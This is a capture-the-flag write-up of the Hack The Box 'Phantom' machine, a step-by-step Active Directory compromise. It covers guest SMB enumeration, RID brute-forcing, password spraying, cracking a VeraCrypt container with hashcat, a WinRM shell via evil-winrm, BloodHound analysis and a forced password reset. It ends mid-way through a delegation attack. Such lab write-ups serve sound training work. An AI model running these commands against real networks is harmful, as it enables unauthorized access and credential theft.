| **Machine**             | \[Phantom]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Medium                                                                                                                           |
| **Key Vulnerabilities** | `Anonymous/Guest SMB access & SAMR RID user enumeration, Sensitive data exposure via SMB,VeraCrypt cracked, Password reuse; WinRM interactive logon allowed ` |
| **Tools Used**          | `nmap, NetExec (nxc), smbclient, truecrypt2john, hashcat, crunch, VeraCrypt, base64, cut/grep, evil-winrm`


## Reconnaissance
Running Nmap

```bash
53/tcp    open  domain        Simple DNS Plus                    
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-20 16:26:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn       
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.phantom.vl
| Issuer: commonName=DC.phantom.vl           
| Public Key type: rsa                       
| Public Key bits: 2048                      
| Signature Algorithm: sha256WithRSAEncryption                 
| Not valid before: 2025-04-14T12:26:31
| Not valid after:  2025-10-14T12:26:31
| MD5:   ef40:3e90:2b8f:ea5d:bb24:20be:57be:d0e7
| SHA-1: 897d:ae13:e94a:ca15:594e:5902:2976:006b:3f41:357c
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQZ95euVcquJNOkmZn60lbFTANBgkqhkiG9w0BAQsFADAY
| MRYwFAYDVQQDEw1EQy5waGFudG9tLnZsMB4XDTI1MDQxNDEyMjYzMVoXDTI1MTAx
| NDEyMjYzMVowGDEWMBQGA1UEAxMNREMucGhhbnRvbS52bDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAN53I2aPSePgnykoMcwwwHpm2HtvNVNrqUhEzGzS
| NB+tSyfdTh4vo1gRHJbaQR1svRuifA/bWsv6aRJZ0fGihT0BNWpY5G80Jr1413ug
| Jfpa3N1v1axT6/JuqjF8gO0yqcra5gtHTLpBb+uf8IPWCpJxxYeWCsJM6Yp/F+u0
| Yz8kHO3zeodDFgNVckbzyRt7C5nrhj/IUoakHHdRh8s5Rv7Vtgb4puuMidy3Gvi9
| EYv7dTIMkydl9mny3YJIubph3393JgPBejPyMou+Me0V+fGn4BJ3dcR1vvL+1vxA
| pdLqn3F+sPySMEe+HpEbNQngxipyv2jAgVsKMhiBvKk/Na0CAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IB
| AQBXazFETBlJFIXOXtHSCZxBhaQBI/BZhYBmS29SMISFUy9iUQuGSG2nAoFxIgVf
| 0F8bpbH3Hr7KwAiFyvHGGL4fRhJsTD5jnX9SD9xAcMr5zPYxVwxOe4vupXQQRueU                                                                     
| aPsK4XQMSbKC9a5Eguw9HtaeFUgLu0n0gUaiTjGOXqet5CMNmVX4Bqnghdm1HlT5
| UlXb2E3ILYg7TG0lU+W/4nGqy+1uA99CXBcye792Qjlt2ekV7fmOVvfqi5D9b5XY                                                                     
| Sumppdhb68volHUoANz/gygmHIeEYKL6BYmPlQjxEbGFcHVFvcVs/+T6RvaxUvhK
| QTUqLBUvOMX0oSo3fSumXmyM                   
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-20T16:28:25+00:00; +14s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-20T16:27:45+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
| QTUqLBUvOMX0oSo3fSumXmyM[0/78]
|_-----END CERTIFICATE-----                                      
|_ssl-date: 2025-08-20T16:28:25+00:00; +14s from scanner time.                                                                         
| rdp-ntlm-info:                                   
|   Target_Name: PHANTOM                                          
|   NetBIOS_Domain_Name: PHANTOM                                                                                                       
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl                             
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-20T16:27:45+00:00               
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55822/tcp open  msrpc         Microsoft Windows RPC            
55847/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:                                      
| smb2-time:                 
|   date: 2025-08-20T16:27:49                                     
|_  start_date: N/A                                               
| p2p-conficker:                                                  
|   Checking for Conficker.C or higher...                         
|   Check 1 (port 17022/tcp): CLEAN (Timeout)                     
|   Check 2 (port 44285/tcp): CLEAN (Timeout)                     
|   Check 3 (port 17084/udp): CLEAN (Timeout)                     
|   Check 4 (port 16364/udp): CLEAN (Timeout)                     
|_  0/4 checks are positive: Host is CLEAN or ports are blocked   
| smb2-security-mode:                                             
|   3:1:1:                                                        
|_    Message signing enabled and required                                                                                             
|_clock-skew: mean: 13s, deviation: 0s, median: 13s               
NSE: Script Post-scanning.                                        
NSE: Starting runlevel 1 (of 3) scan.        
Initiating NSE at 12:28    
Completed NSE at 12:28, 0.00s elapsed                         
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:28 
Completed NSE at 12:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:28        
Completed NSE at 12:28, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.62 seconds
      Raw packets sent: 196723 (8.656MB) | Rcvd: 136 (5.968KB) 

```

Looks like standard ports for a domain controller.

I will add the domain name to the hosts file.

```bash
┌──(kali㉿kali)-[~/machines/htb/Phantom/nmap]
└─$ echo "10.129.234.63     DC.phantom.vl phantom.vl DC" | sudo tee -a /etc/hosts             
10.129.234.63     DC.phantom.vl phantom.vl DC
```
Since there is no HTTP ports, I will start enumeration of SMB/LDAP protocols...

```bash
└─$ nxc smb 10.129.234.63 -u 'guest' -p '' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest: 
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share                 
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.63   445    DC               Public          READ            
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share 
```
We can read the Public share so let's check it.

```bash
└─$ smbclient //10.129.234.63/Public -N                           
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 11 11:03:14 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024

  6127103 blocks of size 4096. 1472743 blocks available

```

I will download the file. Inspecting the file type, I see it's just ASCII text.

```bash
└─$ file tech_support_email.eml
tech_support_email.eml: multipart/mixed; boundary="===============6932979162079994354==", ASCII text  
```
Reading the email I find a username (alucas), which also tells me how usernames are created on the domain (fLastname). This is helpful information we should note.
<img width="1217" height="1485" alt="2025-08-20 183914" src="https://github.com/user-attachments/assets/04634012-4597-4286-a0b3-1fce7cdf43f4" />

The Attachment file is just base64 encoded, so to open it I copied the whole base64 text, decoded it, and pasted it into a new file welcome.pdf and after opening I discovered a password.
<img width="2594" height="1407" alt="2025-08-20 185104" src="https://github.com/user-attachments/assets/b274191b-f44c-4c23-bd2a-ac56b5c2719c" />

This screams for password spraying. We just need more users since we know the convention for how the usernames are created, it won't be a problem.
But thankfully, nxc --rid-brute also works and gives us valid users on the domain.

<img width="2526" height="1385" alt="2025-08-20 190603" src="https://github.com/user-attachments/assets/d34ab04b-87fb-4f2c-8409-10f0c5d64bf4" />

I will clean the output so only the usernames remain.

```bash
└─$ nxc smb 10.129.234.63 -u 'guest' -p '' --rid-brute | cut -d "\\" -f 2 | cut -d "(" -f 1 >> users
```
Now we run a passwordspray attack with the password we discovered in the PDF file and find valid credentials.

```bash 
nxc smb 10.129.234.63 -u users -p 'Ph4nt0m@5t4rt!' --continue-on-success | grep -v "Guest"
-----<snip>----
SMB                      10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE 
SMB                      10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
-----<snip>----
```

One hit for user ibryant.

Discovering shares with the new credentials, we see a new share "Departments Share" that we can read.

```bash
└─$ nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt! 
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ            
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.63   445    DC               Public          READ            
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share 
```

```bash
└─$ smbclient //10.129.234.63/"Departments Share" -U ibryant%'Ph4nt0m@5t4rt!'
Try "help" to get a list of possible commands.
smb: \> ls         
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024                                                                                                                                                                                                    
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

                6127103 blocks of size 4096. 1547379 blocks available
smb: \> ls -R
NT_STATUS_NO_SUCH_FILE listing \-R
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

\Finance
  .                                   D        0  Sat Jul  6 12:25:11 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Expense_Reports.pdf                 A   709718  Sat Jul  6 12:25:11 2024
  Invoice-Template.pdf                A   190135  Sat Jul  6 12:23:54 2024
  TaxForm.pdf                         A   160747  Sat Jul  6 12:22:58 2024

\HR
  .                                   D        0  Sat Jul  6 12:21:31 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Employee-Emergency-Contact-Form.pdf      A    21861  Sat Jul  6 12:21:31 2024
  EmployeeHandbook.pdf                A   296436  Sat Jul  6 12:16:25 2024
  Health_Safety_Information.pdf       A  3940231  Sat Jul  6 12:20:39 2024
  NDA_Template.pdf                    A    18790  Sat Jul  6 12:17:33 2024

\IT
  .                                   D        0  Thu Jul 11 10:59:02 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Backup                              D        0  Sat Jul  6 14:04:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 12:14:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 12:26:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 12:27:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 16:30:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 12:14:08 2024

\IT\Backup
  .                                   D        0  Sat Jul  6 14:04:34 2024
  ..                                  D        0  Thu Jul 11 10:59:02 2024
  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024
-----<snip>----
```
## Foothold

I will download all files. I would guess that the most interesting file is the IT_BACKUP_201123.hc file which is a VeraCrypt container file. I tried to open it, but of course it's protected with a password, so the next logical step is to obtain a hash with truecrypt2john and crack it.

Getting the hash with John, we get four different hashes which is correct.
```bash
─$ truecrypt2john IT_BACKUP_201123.hc 
IT_BACKUP_201123.hc:truecrypt_RIPEMD_160$65bc2466b1604b15a24008d9e3e49a63f4ec7318eea9a9e11eff3943356abf283f406fa7d9ced7acac920d883052bd6830a7fb279ff32059d3f493475bad551b3d32ef4409393d72662931a5bccd45c41a4c455483abe2b34d9ee5eecfb9060e6a0165c2eefce02d7fe61deacf0e55d49f1290a622d06c1b69f716c4ee2d8e51d0cefc5196c63fe3deb59fbfb7b4b86285bbde70dfc602a83ec18af946eaae67b93fdbea302784b523ad5203ed1190e2c5dc20dca86fd0c068c72eb13975c54635a85d7ccebafd3ef51c3c9ad2ab28d7bd17415afa614481ba006e772652b967c490f4d638901f792d8fe9bda589a3653644905f1a24040b1669858d7811b1e1813b5b1ec646a3839d26a1bd14c7542cef9881ba551063f6cf72c86f7c1df39090078caffa0e86c2005d4395984044786f31982ae7b0a6870518786672920f1cff3d02694b03a2c97d70980c09b3e6ab8d8fd0f00bd4cde9ca6615fd4c30791d493360d2366ae8c99e9f7acc3e78e6215a20b7c39e2d49f61a0239e50c076f7d29d5c9d61a2fc15f68c8ad3257b436b2ee337cc33d48257ce44cadafee1e68b316e71a4f9e94eba63013e96b8ee7d087d7f83926fc9face52108ab3a861d97b4e0ea3438aff416b17e5f22feb0a6c40a6e1b28e4ef13e2b74e3b79e0d24a3b83adf4dd7e73d1a75fd1903c4a612fb7fb1237d4df94c3d007ca8f7992c7eceec9:normal::::IT_BACKUP_201123.hc
IT_BACKUP_201123.hc:truecrypt_SHA_512$65bc2466b1604b15a24008d9e3e49a63f4ec7318eea9a9e11eff3943356abf283f406fa7d9ced7acac920d883052bd6830a7fb279ff32059d3f493475bad551b3d32ef4409393d72662931a5bccd45c41a4c455483abe2b34d9ee5eecfb9060e6a0165c2eefce02d7fe61deacf0e55d49f1290a622d06c1b69f716c4ee2d8e51d0cefc5196c63fe3deb59fbfb7b4b86285bbde70dfc602a83ec18af946eaae67b93fdbea302784b523ad5203ed1190e2c5dc20dca86fd0c068c72eb13975c54635a85d7ccebafd3ef51c3c9ad2ab28d7bd17415afa614481ba006e772652b967c490f4d638901f792d8fe9bda589a3653644905f1a24040b1669858d7811b1e1813b5b1ec646a3839d26a1bd14c7542cef9881ba551063f6cf72c86f7c1df39090078caffa0e86c2005d4395984044786f31982ae7b0a6870518786672920f1cff3d02694b03a2c97d70980c09b3e6ab8d8fd0f00bd4cde9ca6615fd4c30791d493360d2366ae8c99e9f7acc3e78e6215a20b7c39e2d49f61a0239e50c076f7d29d5c9d61a2fc15f68c8ad3257b436b2ee337cc33d48257ce44cadafee1e68b316e71a4f9e94eba63013e96b8ee7d087d7f83926fc9face52108ab3a861d97b4e0ea3438aff416b17e5f22feb0a6c40a6e1b28e4ef13e2b74e3b79e0d24a3b83adf4dd7e73d1a75fd1903c4a612fb7fb1237d4df94c3d007ca8f7992c7eceec9:normal::::IT_BACKUP_201123.hc
IT_BACKUP_201123.hc:truecrypt_WHIRLPOOL$65bc2466b1604b15a24008d9e3e49a63f4ec7318eea9a9e11eff3943356abf283f406fa7d9ced7acac920d883052bd6830a7fb279ff32059d3f493475bad551b3d32ef4409393d72662931a5bccd45c41a4c455483abe2b34d9ee5eecfb9060e6a0165c2eefce02d7fe61deacf0e55d49f1290a622d06c1b69f716c4ee2d8e51d0cefc5196c63fe3deb59fbfb7b4b86285bbde70dfc602a83ec18af946eaae67b93fdbea302784b523ad5203ed1190e2c5dc20dca86fd0c068c72eb13975c54635a85d7ccebafd3ef51c3c9ad2ab28d7bd17415afa614481ba006e772652b967c490f4d638901f792d8fe9bda589a3653644905f1a24040b1669858d7811b1e1813b5b1ec646a3839d26a1bd14c7542cef9881ba551063f6cf72c86f7c1df39090078caffa0e86c2005d4395984044786f31982ae7b0a6870518786672920f1cff3d02694b03a2c97d70980c09b3e6ab8d8fd0f00bd4cde9ca6615fd4c30791d493360d2366ae8c99e9f7acc3e78e6215a20b7c39e2d49f61a0239e50c076f7d29d5c9d61a2fc15f68c8ad3257b436b2ee337cc33d48257ce44cadafee1e68b316e71a4f9e94eba63013e96b8ee7d087d7f83926fc9face52108ab3a861d97b4e0ea3438aff416b17e5f22feb0a6c40a6e1b28e4ef13e2b74e3b79e0d24a3b83adf4dd7e73d1a75fd1903c4a612fb7fb1237d4df94c3d007ca8f7992c7eceec9:normal::::IT_BACKUP_201123.hc
IT_BACKUP_201123.hc:truecrypt_RIPEMD_160$b5a8341d016bde98f639f7f094f4aeba27fe0be8b7ef387038d7d714b5cf4c83b513644f699a89976fedf26893b483807b4a4f7e641db3c47b899107e84dcfe9b36daa51b4153aff8a0711fff0e90fc836341ced25fb2f2778b57b455b5a824fe212e570d394fcb167814c24763e736ca87cfb937d2f75b5e567467ecdf9a7d61b95cdae824be2ce29cccd9c162a27bc2cc1d649a5894f7067371337d97192fcb4af0df68844fada276e90ff75fed2269acb93c984de19de9bc282e17d8874f28129bdeb99a7d9d99c0c9dd393c46dbeb373ed8ea0f0666053c3283129d3571dc09480115f2660528afda8fd4fd46ec5cac7ff67c636c3dcac4e95c5f0e5d58c897b238123c2135bf0952881eadf294843ed006dbbc9278dec26f3d38aa051dae1451b2d4058ae0898344daa076917fa306248b34102a39ced251a6dd8413274d44d11972c334f6792f120a73ed0e7e67f8fc9eba38e6b816e6cba06b5f09a62accabf807a07d1a9fbe25124c587236120c97f125ac2a67ed4adbe6911cf04067c2d498ca1528fc9f978f5e5e0d4d79789ae8a022ed9d971fe90d41b78e04c6e51f2a078e8b26fde254d757c6876197459e24e20792be20ea2ab530075f33ae2bd14b4efbaf6e6c74ce37ea7f7ceeddca9f4e1e31f0de86eae1adbac9a6a9f418cd225a9f581acd0c873c64b52e2c64d7a6c31df639e79f40b32d96e8ec64dea:hidden::::IT_BACKUP_201123.hc
IT_BACKUP_201123.hc:truecrypt_SHA_512$b5a8341d016bde98f639f7f094f4aeba27fe0be8b7ef387038d7d714b5cf4c83b513644f699a89976fedf26893b483807b4a4f7e641db3c47b899107e84dcfe9b36daa51b4153aff8a0711fff0e90fc836341ced25fb2f2778b57b455b5a824fe212e570d394fcb167814c24763e736ca87cfb937d2f75b5e567467ecdf9a7d61b95cdae824be2ce29cccd9c162a27bc2cc1d649a5894f7067371337d97192fcb4af0df68844fada276e90ff75fed2269acb93c984de19de9bc282e17d8874f28129bdeb99a7d9d99c0c9dd393c46dbeb373ed8ea0f0666053c3283129d3571dc09480115f2660528afda8fd4fd46ec5cac7ff67c636c3dcac4e95c5f0e5d58c897b238123c2135bf0952881eadf294843ed006dbbc9278dec26f3d38aa051dae1451b2d4058ae0898344daa076917fa306248b34102a39ced251a6dd8413274d44d11972c334f6792f120a73ed0e7e67f8fc9eba38e6b816e6cba06b5f09a62accabf807a07d1a9fbe25124c587236120c97f125ac2a67ed4adbe6911cf04067c2d498ca1528fc9f978f5e5e0d4d79789ae8a022ed9d971fe90d41b78e04c6e51f2a078e8b26fde254d757c6876197459e24e20792be20ea2ab530075f33ae2bd14b4efbaf6e6c74ce37ea7f7ceeddca9f4e1e31f0de86eae1adbac9a6a9f418cd225a9f581acd0c873c64b52e2c64d7a6c31df639e79f40b32d96e8ec64dea:hidden::::IT_BACKUP_201123.hc
IT_BACKUP_201123.hc:truecrypt_WHIRLPOOL$b5a8341d016bde98f639f7f094f4aeba27fe0be8b7ef387038d7d714b5cf4c83b513644f699a89976fedf26893b483807b4a4f7e641db3c47b899107e84dcfe9b36daa51b4153aff8a0711fff0e90fc836341ced25fb2f2778b57b455b5a824fe212e570d394fcb167814c24763e736ca87cfb937d2f75b5e567467ecdf9a7d61b95cdae824be2ce29cccd9c162a27bc2cc1d649a5894f7067371337d97192fcb4af0df68844fada276e90ff75fed2269acb93c984de19de9bc282e17d8874f28129bdeb99a7d9d99c0c9dd393c46dbeb373ed8ea0f0666053c3283129d3571dc09480115f2660528afda8fd4fd46ec5cac7ff67c636c3dcac4e95c5f0e5d58c897b238123c2135bf0952881eadf294843ed006dbbc9278dec26f3d38aa051dae1451b2d4058ae0898344daa076917fa306248b34102a39ced251a6dd8413274d44d11972c334f6792f120a73ed0e7e67f8fc9eba38e6b816e6cba06b5f09a62accabf807a07d1a9fbe25124c587236120c97f125ac2a67ed4adbe6911cf04067c2d498ca1528fc9f978f5e5e0d4d79789
```

>`truecrypt2john` (and `veracrypt2john`) will **dump multiple candidate hashes** because a container can be formatted with different possible hash algorithms (RIPEMD-160, SHA-512, Whirlpool, hidden volumes, etc.).

so before we start cracking it, the machine section information says

>Should you need to crack a hash, use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character)

Based on that information, I will create a custom wordlist with crunch

```bash
└─$ crunch 12 12 -t 'Phantom202%^' -o custom_wordlist.txt
```
And run it with Hashcat:

```bash
└─$ hashcat -m 13721 IT_BACKUP_201123.hc custom_wordlist                                                                                
```
And the hash is successfully cracked.

<img width="1526" height="1120" alt="2025-08-20 202942" src="https://github.com/user-attachments/assets/26db14ba-b714-4125-bd75-d391ba17c41c" />

Now I can mount the .hc file and read it.

```bash
└─$ ./VeraCrypt-1.26.24-x86_64.AppImage --mount IT_BACKUP_201123.hc /media
```
There are a lot of files inside.

```bash
┌──(kali㉿kali)-[/media/veracrypt1]
└─$ ls
'$RECYCLE.BIN'   azure_vms_0805.json   azure_vms_1023.json   azure_vms_1104.json   azure_vms_1123.json   splunk_logs_1003   splunk_logs_1102   splunk_logs1203  'System Volume Information'   ticketing_system_backup.zip   vyos_backup.tar.gz
```
I extracted vyos_backup.tar.gz, and it looks like a file system backup for user vyos.

In the config directory we find a config.boot, which has a plaintext password for user lstanley.
<img width="1614" height="780" alt="2025-08-20 204915" src="https://github.com/user-attachments/assets/b66f2c97-f252-4bbd-8ff1-eeba7d56d5c9" />

But using netexec the password doesn't work for user lstanley.

```bash
└─$ nxc smb 10.129.234.63 -u 'lstanley' -p 'gB6XTcqVP5MlP7Rc' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
```
Let's once again password spray, since we already have usernames.

```bash
└─$ nxc smb 10.129.234.63 -u users -p 'gB6XTcqVP5MlP7Rc' --continue-on-success
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) 
---snip---
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
---snip---
```

And we get a hit for a service account!

```bash
└─$ nxc winrm 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' 
WINRM       10.129.234.63   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) 
WINRM       10.129.234.63   5985   DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc (Pwn3d!)
```
We can even WinRM as that account.

```bash
└─$ evil-winrm -i 10.129.234.63 -u svc_sspr -p 'gB6XTcqVP5MlP7Rc'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> 
```
Let's grab the user flag and move on.

```bash
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> cat user.txt
53ed027**********
```
## Privilege Escalation

Checking for interesting groups or privileges, we don’t find anything.

```powershell
*Evil-WinRM* PS C:\Users\svc_sspr\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
phantom\svc_sspr S-1-5-21-4029599044-1972224926-2225194048-1103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PHANTOM\SSPR Service                        Group            S-1-5-21-4029599044-1972224926-2225194048-1137 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

Let’s run the BloodHound Python ingestor to see if we can find intersting paths.

```bash
└─$ bloodhound-python -c ALL --zip -u svc_sspr -p gB6XTcqVP5MlP7Rc -d phantom.vl -ns 10.129.145.232                                
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: phantom.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.phantom.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.phantom.vl
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 30 users
INFO: Found 61 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.phantom.vl
WARNING: Failed to get service ticket for DC.phantom.vl, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in -1443M 45S
INFO: Compressing output into 20250824122335_bloodhound.zip
```
And run the BloodHound GUI.
I will mark the svc_sspr user as owned and look for outbound object control.

<img width="3592" height="1550" alt="025-08-23 182438" src="https://github.com/user-attachments/assets/d6429da1-eecd-4f3c-bb79-2f41e893d6b5" />

We can change the password of 3 users. All those 3 members are in a group “ICT Security” which has “AddAllowedToAct” permission over DC.PHANTOM.VL.

>If a user has AddAllowedToAct rights over a Domain Controller (DC), you can perform a Resource-Based Constrained Delegation (RBCD) attack. This lets you impersonate any user (including DA) to the DC.

So this is a promising path. Let’s use bloodyAD to change the password for user WSILVA, who is in the ICT Security group.

```bash
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host "10.129.145.232" -d "dc.phantom.vl" -u "svc_sspr" -p "gB6XTcqVP5MlP7Rc" set password "wsilva" "Password123"
[+] Password changed successfully!
```
This opens us up for the RBCD attack.

The first step would be to create a new machine, but trying to do so we get an error that the machine account quota is exceeded.
```bash
└─$ impacket-addcomputer phantom.vl/svc_sspr:'gB6XTcqVP5MlP7Rc' \
    -dc-ip 10.129.145.232 -computer-name 'OWNED01$' -computer-pass 'Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[-] Authenticating account's machine account quota exceeded!
```
So there is another way. On The Hacker Recipes there is an article on how to abuse it on SPN-less users:
